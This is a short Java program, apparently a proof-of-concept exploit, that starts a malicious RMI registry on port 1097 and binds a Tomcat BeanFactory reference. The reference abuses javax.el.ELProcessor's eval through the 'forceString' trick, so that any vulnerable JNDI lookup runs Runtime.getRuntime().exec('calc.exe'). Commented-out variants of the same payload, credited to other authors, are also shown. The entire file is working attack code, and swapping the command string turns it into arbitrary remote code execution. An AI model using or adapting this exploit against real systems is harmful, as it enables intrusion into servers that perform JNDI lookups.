package hacker;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import javax.naming.StringRefAddr;

import demo.Demo1;
import org.apache.naming.ResourceRef;

public class Hacker {

    public static void main(String[] args) throws Exception {
        Registry registry = LocateRegistry.createRegistry(1097);
        //the payload which from Pro
       // ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
       // ref.add(new StringRefAddr("forceString", "a=eval"));
       // ref.add(new StringRefAddr("a", "Runtime.getRuntime().exec(\"calc.exe\")"));

        // the payload to find out something
        //ResourceRef ref = new ResourceRef("demo.Demo1", "hello", "", "", true,"org.apache.naming.factory.BeanFactory",null);

        //the paylaod from Noob-chenlvtang
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", "Runtime.getRuntime().exec(\"calc.exe\")", "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "description=eval"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        registry.bind("hacker", referenceWrapper);
    }
}